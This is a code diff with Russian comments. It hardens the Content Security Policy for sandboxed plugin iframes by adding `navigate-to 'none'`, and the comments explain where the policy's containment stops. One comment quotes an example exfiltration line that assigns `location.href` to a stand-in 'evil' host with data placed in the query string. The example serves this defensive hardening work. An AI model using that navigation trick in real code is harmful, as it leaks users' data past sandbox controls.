@@ -206,8 +206,14 @@ export async function mountPlugin(
  *
  * `connect-src 'none'` (+ img/media/font/form-action 'none') глушит fetch/XHR/beacon/img-пиксель на
  * внешний хост. `script-src`/`style-src 'unsafe-inline'` ОБЯЗАТЕЛЬНЫ: демо использует inline `<script>`
- * и `<style>`; `postMessage` НЕ подпадает под `connect-src` → канал к брокеру (единственный outlet)
- * остаётся жив. `default-src 'none'` закрывает всё прочее (`base-uri`/`frame-src 'none'`).
+ * и `<style>`; `postMessage` НЕ подпадает под `connect-src` → канал к брокеру (broker-outlet) остаётся
+ * жив. `default-src 'none'` закрывает всё прочее (`base-uri`/`frame-src 'none'`).
+ *
+ * ⚠ Это закрывает ТОЛЬКО fetch-класс egress. `navigate-to 'none'` — ПЕРВЫЙ (ненадёжный) слой против
+ * navigation-egress (`location.href='https://evil?d='+данные` — эксфильтрация в query мимо fetch-класса
+ * и мимо `sandbox=allow-scripts`, который блокирует лишь parent/top-навигацию, не self-навигацию iframe).
+ * Поддержка `navigate-to` в WKWebView НЕПОСЛЕДОВАТЕЛЬНА → это defence-in-depth, НЕ гарантия; полное
+ * закрытие navigation-egress требует Tauri sub-frame navigation-handler (PLUG-2, до untrusted-кода; BACKLOG).
  *
  * ⚠ Единая точка: любой путь генерации srcdoc обязан прогонять HTML через `withPluginCsp` (untrusted
  * PLUG-2 автоматически получит контейнмент). НЕ хардкодить CSP-строку в двух местах.
@@ -215,7 +221,7 @@ export async function mountPlugin(
 export const PLUGIN_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
   "connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; " +
-  "form-action 'none'; frame-src 'none'; base-uri 'none'";
+  "form-action 'none'; frame-src 'none'; base-uri 'none'; navigate-to 'none'";
 
 /**
  * Вставляет [`PLUGIN_CSP`] ПЕРВЫМ тегом внутрь `<head>` переданного HTML плагина. Единая точка вставки
